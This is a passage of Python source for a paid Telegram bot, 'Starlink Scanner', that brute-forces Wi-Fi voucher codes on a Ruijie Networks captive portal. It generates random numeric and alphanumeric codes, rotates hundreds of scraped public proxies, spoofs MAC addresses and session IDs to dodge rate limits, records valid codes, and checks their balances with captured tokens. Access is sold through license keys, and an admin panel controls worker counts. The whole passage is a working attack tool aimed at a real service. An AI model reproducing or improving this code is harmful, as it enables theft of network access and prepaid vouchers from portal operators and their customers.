                            entry['source'] = "❌"
                            async with ud['codes_lock']:
                                for c in ud['all_success_codes']:
                                    if c['code'] == code:
                                        c['balance_str'] = "❌ no token"
                                        c['source'] = "❌"
                                        break
                            context = ud.get('context')
                            if context:
                                try:
                                    await send_success_code_chunked(context, user_id, code, "❌ no token", "❌")
                                except Exception as e:
                                    print(f"[Success] Error: {e}")
                            ud['dash_update_event'].set()
                        return 'hit'
                    elif "expired" in l_text:
                        ud['stats']['expired'] += 1
                        ud['dash_update_event'].set()
                        return 'expired'
                    elif "the number of sta exceeds the limit" in l_text or "limit" in l_text:
                        ud['stats']['limits'] += 1
                        if code not in ud['limit_codes']:
                            ud['limit_codes'].append(code)
                        ud['recent_logs'].append(f"⚠️ LIMIT: {code}")
                        if len(ud['recent_logs']) > 5:
                            ud['recent_logs'] = ud['recent_logs'][-5:]
                        ud['dash_update_event'].set()
                        return 'limit'
                    return 'failed'
        except Exception:
            return 'failed'
    return 'failed'

# ==================== WORKER ====================
async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager(user_id)
    ud['dash_update_event'].set()
    if worker_id == 0:
        async def periodic_dash_update():
            while not ud['stop_event'].is_set():
                await asyncio.sleep(1.0)
                ud['dash_update_event'].set()
        asyncio.create_task(periodic_dash_update())
    while not ud['stop_event'].is_set():
        proxy = await pm.get_next()
        if proxy is None:
            await asyncio.sleep(1)
            continue
        proxy_connector = create_connector_for_proxy(proxy)
        async with aiohttp.ClientSession(
                connector=proxy_connector, connector_owner=True,
                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC)
        ) as session:
            current_session_id = None
            codes_checked_this_sid = 0
            codes_checked_this_session = 0
            sid_failures = 0
            while not ud['stop_event'].is_set() and codes_checked_this_session < MAX_CODES_PER_SESSION:
                if current_session_id is None or codes_checked_this_sid >= MAX_CODES_PER_SID:
                    sid, mac = await get_sid_from_gateway(session, ud['portal_url'], user_id)
                    if sid is None:
                        sid_failures += 1
                        if sid_failures >= 2:
                            await pm.mark_bad(proxy)
                            break
                        await asyncio.sleep(0.3)
                        continue
                    current_session_id = sid
                    codes_checked_this_sid = 0
                    sid_failures = 0
                code = None
                for _ in range(10):
                    if ud['mode'] == "custom" and ud['start_digit'] is not None:
                        body_chars = random.choices(ud['char_set'], k=ud['code_len'] - 1)
                        random.shuffle(body_chars)
                        code = ud['start_digit'] + ''.join(body_chars)
                    else:
                        code = ''.join(random.choices(ud['char_set'], k=ud['code_len']))
                    if code not in ud['tried_codes']:
                        ud['tried_codes'].add(code)
                        break
                if code is None or ud['stop_event'].is_set():
                    break
                ud['CURRENT_CODE'] = code
                result = await check_single_access_code(session, code, current_session_id,
                                                         login_url, captcha_base_url, verify_url,
                                                         headers, user_id, proxy)
                codes_checked_this_sid += 1
                codes_checked_this_session += 1
                if result == 'limit':
                    current_session_id = None

# ==================== DASHBOARD ====================
async def live_dashboard_updater(context, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager(user_id)
    last_edit_time = 0
    MIN_EDIT_INTERVAL = 1.0
    first_update = True
    while not ud['stop_event'].is_set():
        if ud['dash_msg_id'] is None:
            await asyncio.sleep(0.1)
            continue
        now = time.time()
        if not first_update and now - last_edit_time < MIN_EDIT_INTERVAL:
            await asyncio.sleep(MIN_EDIT_INTERVAL - (now - last_edit_time))
            continue
        try:
            stats = ud['stats']
            elapsed = time.time() - stats['start_time']
            speed_cpm = (stats['tried'] / elapsed) * 60 if elapsed > 0 else 0
            proxy_total, proxy_active = pm.stats()
            now_str = mm_time_str('%H:%M:%S')
            text = (
                f"⚡ <b>Scanner Running</b>\n"
                f"🕐 Last Update: <code>{now_str}</code>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🏹 Tried : {stats['tried']:,}\n"
                f"🔥 Hits  : {stats['hits']}\n"
                f"⚡ Speed : {speed_cpm:.1f} c/m\n"
                f"🔀 Proxies: {proxy_active}/{proxy_total}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
            )
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(text="🛑 Stop Scan", callback_data="stop_scan")],
                [InlineKeyboardButton(text="🔄 Rearrange Codes (Live)", callback_data="rearrange_codes_live")],
            ])
            try:
                await context.bot.edit_message_text(
                    chat_id=user_id, message_id=ud['dash_msg_id'],
                    text=text, reply_markup=keyboard, parse_mode=ParseMode.HTML
                )
                last_edit_time = time.time()
                first_update = False
            except Exception as e:
                err = str(e).lower()
                if "flood" in err or "too many" in err:
                    await asyncio.sleep(3.0)
        except Exception:
            pass
        try:
            await asyncio.wait_for(ud['dash_update_event'].wait(), timeout=1.0)
            ud['dash_update_event'].clear()
        except asyncio.TimeoutError:
            pass

# ==================== AUTO RETRY ====================
def _is_pending(item):
    if not item:
        return False
    bs = item.get('balance_str', '')
    if bs.startswith('...'):
        return True
    if bs.startswith('❌') or bs.startswith('⚠️'):
        return True
    return False


async def auto_retry_pending(ud, context, user_id):
    pending = [it for it in ud['valid_codes'] if _is_pending(it)]
    if not pending:
        return
    total = len(pending)
    try:
        retry_msg = await context.bot.send_message(
            user_id,
            f"🔄 Auto retrying {total} pending balance(s)..."
        )
    except Exception:
        retry_msg = None
    sem = asyncio.Semaphore(RETRY_CONCURRENCY)
    lock = asyncio.Lock()
    done_count = {'n': 0}
    success_count = {'n': 0}
    pm = get_proxy_manager(user_id)

    async def _retry_one(it):
        async with sem:
            token = it.get('active_token')
            if not token:
                it['balance_str'] = "❌ no token"
                it['source'] = "❌"
            else:
                proxy_used = await pm.get_random()
                ok, result = False, "no proxy"
                if proxy_used:
                    ok, result = await fetch_balance_with_proxy(token, proxy_used, timeout=5)
                if not ok:
                    ok, result = await fetch_balance_direct(token, timeout=5)
                it['balance_str'] = result if ok else f"❌ {result}"
                it['source'] = "proxy" if ok and proxy_used else ("direct" if ok else "❌")
                if ok:
                    async with lock:
                        success_count['n'] += 1
            async with lock:
                done_count['n'] += 1
                if done_count['n'] % 3 == 0 or done_count['n'] == total:
                    try:
                        if retry_msg:
                            await context.bot.edit_message_text(
                                chat_id=user_id, message_id=retry_msg.message_id,
                                text=(f"🔄 Retry: {done_count['n']}/{total}\n"
                                      f"✅ Success: {success_count['n']}")
                            )
                    except Exception:
                        pass

    tasks = [asyncio.create_task(_retry_one(it)) for it in pending]
    await asyncio.gather(*tasks, return_exceptions=True)
    try:
        if retry_msg:
            await context.bot.edit_message_text(
                chat_id=user_id, message_id=retry_msg.message_id,
                text=f"✅ Retry done. {total} processed, {success_count['n']} success."
            )
    except Exception:
        pass

# ==================== PROXY CHECKER ====================
async def fetch_proxy_list(url):
    proxies = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=15) as resp:
                if resp.status == 200:
                    content_type = resp.headers.get('content-type', '')
                    if 'application/json' in content_type:
                        data = await resp.json()
                        items = None
                        if isinstance(data, list):
                            items = data
                        elif isinstance(data, dict):
                            for key in ('data', 'items', 'results'):
                                if key in data and isinstance(data[key], list):
                                    items = data[key]
                                    break
                        if items:
                            for item in items:
                                if isinstance(item, dict) and 'ip' in item and 'port' in item:
                                    ip = str(item['ip']).strip()
                                    port = str(item['port']).strip()
                                    if ip and port:
                                        proxies.append(f"http://{ip}:{port}")
                    else:
                        text = await resp.text()
                        for line in text.splitlines():
                            line = line.strip()
                            if line and not line.startswith('#'):
                                if not line.startswith(('http://', 'https://')):
                                    line = 'http://' + line
                                proxies.append(line)
    except Exception as e:
        print(f"Error fetching {url}: {e}")
    return proxies


async def check_proxy_working(session, proxy, portal_url, semaphore, stop_event, user_id):
    async with semaphore:
        if stop_event.is_set():
            return None
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            u = urlparse(portal_url)
            query = parse_qs(u.query)
            mac = generate_random_mac()
            query['mac'] = [mac]
            spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))
            async with session.get(spoofed_url, headers=headers, timeout=5, ssl=False, proxy=proxy) as r2:
                body = await r2.text()
                match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
                if match:
                    final_url = urljoin(spoofed_url, match.group(1))
                    async with session.get(final_url, headers=headers, timeout=5, ssl=False, proxy=proxy) as r3:
                        final_url = str(r3.url)
                else:
                    final_url = str(r2.url)
                parsed_query = parse_qs(urlparse(final_url).query)
                sid = parsed_query.get('sessionId', parsed_query.get('sid', [None]))[0]
                if sid:
                    return proxy
        except Exception:
            pass
        return None


async def run_proxy_check(context, chat_id, user_id, sources=None):
    stop_event = asyncio.Event()
    user_proxy_checks[user_id] = {'stop_event': stop_event, 'msg_id': None, 'task': asyncio.current_task()}
    if sources is None:
        sources = PROXY_SOURCES
    try:
        init_msg = await context.bot.send_message(chat_id, "⏳ Downloading proxies...")
        user_proxy_checks[user_id]['msg_id'] = init_msg.message_id
    except Exception as e:
        print(f"[ProxyCheck] Cannot send init msg: {e}")
        return
    progress_msg_id = init_msg.message_id
    stop_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🛑 Stop & Save", callback_data="proxy_check_stop")]
    ])
    all_proxies = []
    for i, url in enumerate(sources, 1):
        if stop_event.is_set():
            break
        p = await fetch_proxy_list(url)
        print(f"Source {i}: {len(p)} proxies")
        all_proxies.extend(p)
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=progress_msg_id,
                text=f"📥 Downloading...\nSource {i}/{len(sources)}: {len(p)}\nTotal: {len(all_proxies)}",
                reply_markup=stop_kb
            )
        except Exception:
            pass
    seen = set()
    unique_proxies = []
    for p in all_proxies:
        if p not in seen:
            seen.add(p)
            unique_proxies.append(p)
    if not unique_proxies:
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=progress_msg_id,
                text="❌ No proxies found."
            )
        except Exception:
            pass
        user_proxy_checks.pop(user_id, None)
        return
    total = len(unique_proxies)
    CONCURRENCY = 100
    semaphore = asyncio.Semaphore(CONCURRENCY)
    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    timeout = aiohttp.ClientTimeout(total=5)
    good_proxies = []
    checked = 0
    last_update = time.time()
    portal_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=c4b25b4e24cf&gw_sn=H1TC2LY000735&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.170&mac=5e:21:ad:5d:13:0d&slot_num=14&nasip=192.168.1.71&ssid=PAING&ustate=0&mac_req=1&url=http%3A%2F%2Fconnectivitycheck%2Egstatic%2Ecom%2Fgenerate%5F204&chap_id=%5C002&chap_challenge=%5C022%5C076%5C030%5C160%5C346%5C277%5C107%5C257%5C116%5C227%5C172%5C334%5C045%5C220%5C357%5C371&v=2"
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        for proxy in unique_proxies:
            tasks.append(asyncio.create_task(
                check_proxy_working(session, proxy, portal_url, semaphore, stop_event, user_id)
            ))
        for completed_task in asyncio.as_completed(tasks):
            if stop_event.is_set():
                for t in tasks:
                    if not t.done():
                        t.cancel()
                break
            try:
                result = await completed_task
            except Exception:
                result = None
            if result:
                good_proxies.append(result)
            checked += 1
            now = time.time()
            if checked % 50 == 0 or now - last_update > 2 or checked == total:
                last_update = now
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id, message_id=progress_msg_id,
                        text=f"📊 Checked: {checked}/{total}\n✅ Working: {len(good_proxies)}",
                        reply_markup=stop_kb
                    )
                except Exception:
                    pass
    pm = get_proxy_manager(user_id)
    added = pm.add_proxies(good_proxies)
    final_text = f"✅ Done.\nWorking: {len(good_proxies)}/{total}\n📥 Added {added} new to {pm.file_path}"
    try:
        await context.bot.edit_message_text(chat_id=chat_id, message_id=progress_msg_id, text=final_text)
    except Exception:
        pass
    user_proxy_checks.pop(user_id, None)

# ==================== CODE GENERATOR ====================
def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))


def engsmall_generator(length):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))


def engmixed_generator(length):
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choice(chars) for _ in range(length))


def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
        if mode == "6":
            codes = [str(i).zfill(6) for i in range(10 ** 6)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "7":
            codes = [str(i).zfill(7) for i in range(10 ** 7)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "8":
            while True:
                yield digit_generator(8)
    if mode == "eng7":
        while True:
            yield ''.join(random.choices(string.ascii_lowercase, k=7))
    if mode == "engsmall6":
        while True:
            yield engsmall_generator(6)
    if mode == "engsmall7":
        while True:
            yield engsmall_generator(7)
    if mode == "engsmall8":
        while True:
            yield engsmall_generator(8)
    if mode == "engmixed6":
        while True:
            yield engmixed_generator(6)
    if mode == "engmixed7":
        while True:
            yield engmixed_generator(7)
    if mode == "engmixed8":
        while True:
            yield engmixed_generator(8)
    raise ValueError(f"Unsupported scan mode: {mode}")


def format_progress(checked, total=None, speed=0, found=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100 if total > 0 else 0
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (f"🔍Scanning...\n📦Checked: {checked:,}/{total:,}\n"
                f"📊Progress: {percent:.2f}%\n⚡Speed: {speed_str}\n"
                f"✅Hits: {found}\n[{bar}]")
    return (f"🔍Scanning...\n📦Checked: {checked:,}\n"
            f"⚡Speed: {speed_str}\n✅Hits: {found}\n📊Running")

# ==================== RUN USER SCANNER ====================
async def run_user_scanner(context, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager(user_id)
    proxy_total, proxy_active = pm.stats()
    if proxy_total == 0:
        await context.bot.send_message(user_id, "⚠️ No proxies loaded!")
        return

    # WORKER LIMITS PER ROLE
    if user_id in ADMIN_IDS and ud['num_workers'] > ADMIN_WORKERS:
        ud['num_workers'] = ADMIN_WORKERS
    if user_id not in ADMIN_IDS and ud['num_workers'] > USER_WORKERS:
        ud['num_workers'] = USER_WORKERS

    login_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    captcha_base_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/image"
    verify_url = "https://portal-ruijienetworks.com/api/auth/captcha/verify"
    # Correct verify URL
    verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Origin": "https://portal-as.ruijienetworks.com",
        "Referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
    }
    ud['balance_queue'] = asyncio.Queue()
    ud['dash_update_event'].clear()
    ud['context'] = context
    ud['dash_update_event'].set()
    tasks = [asyncio.create_task(live_dashboard_updater(context, user_id))]
    worker_count = ud.get('num_workers', NUM_WORKERS)
    for i in range(worker_count):
        tasks.append(asyncio.create_task(worker(i, login_url, captcha_base_url, verify_url, headers, user_id)))
    for bw in range(BALANCE_WORKERS):
        tasks.append(asyncio.create_task(balance_worker(user_id, bw)))
    ud['task'] = asyncio.current_task()
    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        for t in tasks:
            if not t.done():
                t.cancel()
        raise
    finally:
        stats = ud['stats']
        elapsed = time.time() - stats['start_time']
        speed_cpm = (stats['tried'] / elapsed) * 60 if elapsed > 0 else 0
        proxy_total, proxy_active = pm.stats()
        final_text = (
            f"🛑 <b>Scanner Stopped</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🔋 Tried: {stats['tried']:,}\n"
            f"🟢 Hits: {stats['hits']}\n"
            f"⚡ Speed: {speed_cpm:.1f} c/m\n"
            f"━━━━━━━━━━━━━━━━━━\n"
        )
        if ud['dash_msg_id']:
            try:
                await context.bot.edit_message_text(
                    chat_id=user_id, message_id=ud['dash_msg_id'],
                    text=final_text, parse_mode=ParseMode.HTML
                )
            except Exception:
                await context.bot.send_message(user_id, final_text, parse_mode=ParseMode.HTML)
        else:
            await context.bot.send_message(user_id, final_text, parse_mode=ParseMode.HTML)
        await auto_retry_pending(ud, context, user_id)
        ud['stop_event'].clear()
        ud['dash_msg_id'] = None
        ud['task'] = None
        ud['context'] = None

# ==================== KEYBOARDS ====================
def get_user_reply_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🌐 Update Portal"), KeyboardButton("⚙️ Mode")],
        [KeyboardButton("🔍 Proxy Checker"), KeyboardButton("🚀 Start Scanner")],
        [KeyboardButton("🛑 Stop"), KeyboardButton("🔄 Rearrange Codes")],
    ], resize_keyboard=True)


# (Item 12) Admin keyboard now includes 👷 User Workers button.
def get_admin_reply_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🌐 Update Portal"), KeyboardButton("⚙️ Mode")],
        [KeyboardButton("🔍 Proxy Checker"), KeyboardButton("👷 Set Workers")],
        [KeyboardButton("🚀 Start Scanner"), KeyboardButton("🛑 Stop")],
        [KeyboardButton("📂 Manage URLs"), KeyboardButton("🔄 Rearrange Codes")],
        [KeyboardButton("👷 User Workers"), KeyboardButton("🔑 Admin Panel")],
    ], resize_keyboard=True)


REPLY_BUTTONS = [
    "🌐 Update Portal", "⚙️ Mode",
    "🔍 Proxy Checker", "👷 Set Workers",
    "🚀 Start Scanner", "🛑 Stop",
    "📂 Manage URLs", "🔄 Rearrange Codes",
    "👷 User Workers", "🔑 Admin Panel",
]


def get_mode_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="Number 6", callback_data="set_mode_num6"),
         InlineKeyboardButton(text="Number 7", callback_data="set_mode_num7"),
         InlineKeyboardButton(text="Number 8", callback_data="set_mode_num8")],
        [InlineKeyboardButton(text="Number 9", callback_data="set_mode_num9")],
        [InlineKeyboardButton(text="Abc 6 (a-z)", callback_data="set_mode_abc6"),
         InlineKeyboardButton(text="Eng 7 (a-z)", callback_data="set_mode_eng7")],
        [InlineKeyboardButton(text="Mix 6", callback_data="set_mode_mix6"),
         InlineKeyboardButton(text="Mix 7", callback_data="set_mode_mix7"),
         InlineKeyboardButton(text="Mix 8", callback_data="set_mode_mix8"),
         InlineKeyboardButton(text="Mix 9", callback_data="set_mode_mix9")],
        [InlineKeyboardButton(text="Custom Start", callback_data="set_mode_custom")],
    ])


# (Item 20) Admin main keyboard now includes 👷 Set User Workers entry.
def get_admin_main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🔑 Generate Key", callback_data="admin_genkey"),
         InlineKeyboardButton(text="🗑️ Delete Key", callback_data="admin_delkey")],
        [InlineKeyboardButton(text="📋 List Keys", callback_data="admin_listkeys"),
         InlineKeyboardButton(text="📊 Bot Stats", callback_data="admin_stats")],
        [InlineKeyboardButton(text="📢 Broadcast", callback_data="admin_broadcast"),
         InlineKeyboardButton(text="👥 Users List", callback_data="admin_users")],
        [InlineKeyboardButton(text="👷 Set User Workers", callback_data="admin_set_user_workers")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="admin_back")],
    ])


def get_admin_genkey_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="⏱️ 30m", callback_data="admin_gen_30m"),
         InlineKeyboardButton(text="⏱️ 1h", callback_data="admin_gen_1h")],
        [InlineKeyboardButton(text="📅 1d", callback_data="admin_gen_1d"),
         InlineKeyboardButton(text="📅 7d", callback_data="admin_gen_7d")],
        [InlineKeyboardButton(text="📅 1m", callback_data="admin_gen_1m"),
         InlineKeyboardButton(text="📅 1y", callback_data="admin_gen_1y")],
        [InlineKeyboardButton(text="♾️ Unlimited", callback_data="admin_gen_unlimited")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="admin_back")],
    ])


def get_scam_button_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🛑 Stop Scan", callback_data="stop_scan")],
        [InlineKeyboardButton(text="🔄 Rearrange Codes (Live)", callback_data="rearrange_codes_live")],
    ])


def get_user_action_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="📋 Success Codes", callback_data="show_result"),
         InlineKeyboardButton(text="🔄 Recheck", callback_data="recheck")],
        [InlineKeyboardButton(text="🛑 Stop Scan", callback_data="stop_scan"),
         InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")],
        [InlineKeyboardButton(text="🔄 Rearrange Codes", callback_data="rearrange_codes")],
    ])


def get_manage_urls_keyboard(user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="📂 List Saved URLs", callback_data="manage_urls_list")],
        [InlineKeyboardButton(text="🎯 Set Active", callback_data="manage_urls_set")],
        [InlineKeyboardButton(text="🗑️ Delete a URL", callback_data="manage_urls_delete")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")],
    ])


def get_proxy_checker_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🔍 Auto Check", callback_data="proxy_check_auto")],
        [InlineKeyboardButton(text="🗑 Clear proxies.txt", callback_data="proxy_clear_file")],
    ])


# (Item 14) Worker preset keyboard shown after admin enters target ID.
def get_worker_preset_keyboard(target_user_id):
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("50", callback_data=f"wk_set_{target_user_id}_50"),
            InlineKeyboardButton("100", callback_data=f"wk_set_{target_user_id}_100"),
        ],
        [
            InlineKeyboardButton("200", callback_data=f"wk_set_{target_user_id}_200"),
            InlineKeyboardButton("300", callback_data=f"wk_set_{target_user_id}_300"),
        ],
        [
            InlineKeyboardButton("❌ Cancel", callback_data=f"wk_cancel_{target_user_id}"),
        ],
    ])

# ==================== ADMIN DECORATOR ====================
def admin_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        try:
            if update.effective_user is None:
                return
            user_id = update.effective_user.id
        except Exception:
            return
        if user_id not in ADMIN_IDS:
            try:
                if update.effective_message:
                    await update.effective_message.reply_text(
                        "⛔ ဤ Bot ကို အသုံးပြုခွင့်မရှိပါ။ အသုံးပြုချင်ပါက telegram @makkuqt ဆီမှာ ၀ယ်ပါရန်"
                    )
            except Exception:
                pass
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

# ==================== SCAN LOG ====================
async def log_scan_start(context, user_id, mode, portal_url):
    try:
        chat = await context.bot.get_chat(user_id)
        name = safe_username(chat.first_name or chat.username or "User", 20)
    except Exception:
        name = "User"
    text = (
        f"🚀 <b>SCAN STARTED</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 Name: <code>{escape_html(name)}</code>\n"
        f"🆔 User ID: <code>{user_id}</code>\n"
        f"⚙️ Mode: <code>{mode}</code>\n"
        f"🔗 Portal:\n<code>{escape_html(portal_url[:200])}</code>\n"
        f"🕐 Time: <code>{mm_datetime_str('%Y-%m-%d %H:%M:%S')}</code>"
    )
    try:
        await context.bot.send_message(
            chat_id=LOG_GROUP_ID, text=text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )
    except Exception as e:
        print(f"[Log] Failed: {e}")

# ==================== REPLY BUTTON DISPATCHER ====================
async def handle_reply_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    text = (update.message.text or "").strip()
    is_admin_user = user_id in ADMIN_IDS

    # Admin-only buttons
    if text in ("📂 Manage URLs", "👷 Set Workers", "🔑 Admin Panel", "👷 User Workers") and not is_admin_user:
        await update.message.reply_text("⛔ Admin only.")
        return

    if text == "🔑 Admin Panel":
        await admin_cmd(update, context)
        return

    # (Item 12) 👷 User Workers → ask for target ID.
    if text == "👷 User Workers":
        ud['state'] = 'waiting_for_target_user_id'
        await update.message.reply_text(
            "👷 <b>Set Workers for a User</b>\n\n"
            "Send the target user's Telegram ID:",
            parse_mode=ParseMode.HTML
        )
        return

    if text == "🌐 Update Portal":
        ud['state'] = 'waiting_for_portal_url'
        await update.message.reply_text("🌐 <b>Send Portal URL.</b>", parse_mode=ParseMode.HTML)

    elif text == "⚙️ Mode":
        await update.message.reply_text(
            "⚙️ <b>Choose Mode</b>",
            reply_markup=get_mode_keyboard(),
            parse_mode=ParseMode.HTML
        )

    elif text == "🔍 Proxy Checker":
        await update.message.reply_text(
            "🔍 <b>Proxy Checker</b>",
            reply_markup=get_proxy_checker_keyboard(),
            parse_mode=ParseMode.HTML
        )

    elif text == "👷 Set Workers":
        ud['state'] = 'waiting_for_workers'
        await update.message.reply_text(
            f"👷 Workers (current: {ud['num_workers']}). Send a number 1-{ADMIN_WORKERS}:"
        )

    elif text == "🚀 Start Scanner":
        if not ud['portal_url']:
            active = get_active_portal(user_id)
            if active:
                ud['portal_url'] = active['url']
            else:
                await update.message.reply_text("❌ No Portal URL. Use 🌐 Update Portal first.")
                return

        # (Item 5) Proxy enforcement per-user.
        pm_check = get_proxy_manager(user_id)
        pt_check, pa_check = pm_check.stats()
        if pt_check == 0:
            await update.message.reply_text(
                "⛔ <b>No proxies loaded.</b>\n\n"
                "📥 Load your own proxies first:\n"
                "🔍 Proxy Checker → Auto Check",
                parse_mode=ParseMode.HTML
            )
            return

        if ud['task'] and not ud['task'].done():
            ud['stop_event'].set()
            ud['dash_update_event'].set()
            ud['task'].cancel()
            try:
                await asyncio.wait_for(ud['task'], timeout=3.0)
            except Exception:
                pass
        ud['stop_event'].clear()
        ud['stats'] = {'tried': 0, 'hits': 0, 'expired': 0, 'limits': 0, 'start_time': time.time()}
        ud['valid_codes'] = []
        ud['all_success_codes'] = []
        ud['limit_codes'] = []
        ud['tried_codes'] = set()
        ud['recent_logs'] = []
        ud['CURRENT_CODE'] = '----'
        ud['balance_queue'] = asyncio.Queue()
        ud['success_msg_id'] = None
        ud['success_codes_list'] = []
        ud['last_success_edit'] = 0
        ud['code_chunks'] = []
        ud['current_chunk_codes'] = []
        ud['current_chunk_msg_id'] = None
        ud['total_codes_sent'] = 0
        ud['context'] = None
        ud['last_chunk_edit_time'] = 0
        now_str = mm_time_str('%H:%M:%S')
        pm_local = get_proxy_manager(user_id)
        pt, pa = pm_local.stats()
        initial_text = (
            f"⚡ <b>Scanner Running</b>\n"
            f"🕐 Last Update: <code>{now_str}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🏹 Tried : 0\n"
            f"🔥 Hits  : 0\n"
            f"⚡ Speed : 0.0 c/m\n"
            f"🔀 Proxies: {pa}/{pt}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
        )
        start_msg = await update.message.reply_text(
            initial_text, reply_markup=get_scam_button_keyboard(), parse_mode=ParseMode.HTML
        )
        ud['dash_msg_id'] = start_msg.message_id
        asyncio.create_task(run_user_scanner(context, user_id))
        asyncio.create_task(log_scan_start(context, user_id, ud['mode'], ud['portal_url']))

    elif text == "🛑 Stop":
        ud['stop_event'].set()
        ud['dash_update_event'].set()
        if ud['task'] and not ud['task'].done():
            ud['task'].cancel()
        pc = user_proxy_checks.get(user_id)
        if pc and pc.get('stop_event'):
            pc['stop_event'].set()
        await update.message.reply_text("🛑 Stopped.")

    elif text == "📂 Manage URLs":
        data = load_user_portals(user_id)
        active = data.get("active")
        active_url = "None"
        if active:
            for u in data["urls"]:
                if u["name"] == active:
                    active_url = u["url"]
                    break
        await update.message.reply_text(
            f"📂 <b>Manage Portal URLs</b>\n\n"
            f"🎯 Active: <code>{escape_html(active or 'None')}</code>\n"
            f"🔗 URL: <code>{escape_html(active_url)}</code>",
            reply_markup=get_manage_urls_keyboard(user_id),
            parse_mode=ParseMode.HTML
        )

    elif text == "🔄 Rearrange Codes":
        await send_rearranged_codes(context, user_id, ascending=True)

# ==================== /start ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    ud['state'] = None
    is_admin_user = user_id in ADMIN_IDS

    if not is_admin_user:
        status = get_user_status(user_id)
        if not status or not status['active']:
            await update.message.reply_text(
                "⛔ <b>No active plan.</b>\n\n"
                "🎫 Redeem your key:\n"
                "<code>/key JAZZ-XXXX-XXXX-XXXX</code>\n\n"
                "👨‍💻 Buy a key: @makkuqt",
                parse_mode=ParseMode.HTML
            )
            return
        plan_line = (
            f"📋 Plan: <code>{escape_html(status['plan'])}</code>\n"
            f"⏰ Expires: <code>{escape_html(status['expires_at'][:16])}</code>\n"
        )
    else:
        plan_line = "👑 <b>ADMIN ACCESS</b>\n"

    pm = get_proxy_manager(user_id)
    pt, pa = pm.stats()
    try:
        raw_name = update.effective_user.first_name or update.effective_user.username or "User"
        display_name = safe_username(raw_name, max_len=20)
    except Exception:
        display_name = "User"

    kb = get_admin_reply_keyboard() if is_admin_user else get_user_reply_keyboard()
    msg = await update.message.reply_text(
        f"⚡ <b>Starlink Scanner</b> ⚡\n\n"
        f"👤 {escape_html(display_name)}\n"
        f"{plan_line}"
        f"⚙️ Mode: <code>{ud['mode']}</code>\n"
        f"🔀 Proxies: <code>{pa}/{pt}</code>\n"
        f"👷 Workers: <code>{ud['num_workers']}</code>\n\n"
        f"👇 Use the menu below.",
        reply_markup=kb,
        parse_mode=ParseMode.HTML
    )
    ud['menu_msg_id'] = msg.message_id

# ==================== /stop ====================
@admin_only
async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    stopped = False
    if ud['task'] and not ud['task'].done():
        ud['stop_event'].set()
        ud['dash_update_event'].set()
        ud['task'].cancel()
        stopped = True
